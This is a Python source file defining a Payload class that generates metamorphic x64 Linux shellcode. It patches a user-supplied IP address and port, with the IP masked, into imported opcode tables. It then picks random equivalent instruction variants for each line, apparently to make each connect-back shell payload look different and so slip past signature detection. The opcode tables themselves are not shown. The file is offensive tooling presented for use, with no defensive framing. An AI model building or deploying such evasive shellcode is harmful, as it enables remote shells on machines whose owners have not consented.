from opcodes import linux_x64
from random import randint
from utils import *

class Payload:
    def __init__(self,platform,port,ip):
        """
        Payload's constructor method from a platform (Windows/Linux), a port and an ip.

        Example: Payload(platform="Linux",port=4444,ip=127.0.0.1)
        """
        self.shellcode = ""
        self.platform = platform
        self.arch = "x64"
        self.port = port
        self.ip = ip

    def __str__(self):
        """
        ToString of the Payload object
        """
        return f"\nPlatform: {self.platform} {self.arch} - {self.get_bytes_size()} Bytes\nIP: {self.ip}\nPort: {self.port} \nShellcode:\n{self.shellcode}"

    def permut(self):
        """
        This method performs metamorphism on a shellcode.

        Example: payload.permut()
        """

        # Add port to the shellcode
        linux_x64[20][0] += convert_port_to_hex(self.port) 
        # Add masked IP address to the shellcode
        linux_x64[17][0] += get_ip_and_mask(ip_to_hex(self.ip))[0]
        # Add mask to the shellcode
        linux_x64[18][0] += get_ip_and_mask(ip_to_hex(self.ip))[1]

         # If the platform is Linux, select random lines from the shellcode arrays and append to self.shellcode
        if self.platform == "Linux" and self.arch == "x64":
            for line in linux_x64:
                    self.shellcode += line[randint(0,len(line)-1)]

    def get_bytes_size(self):
        """
        Bytes of the payload.

        Example: payload.get_bytes_size()
        """
        return self.shellcode.count(r"\x")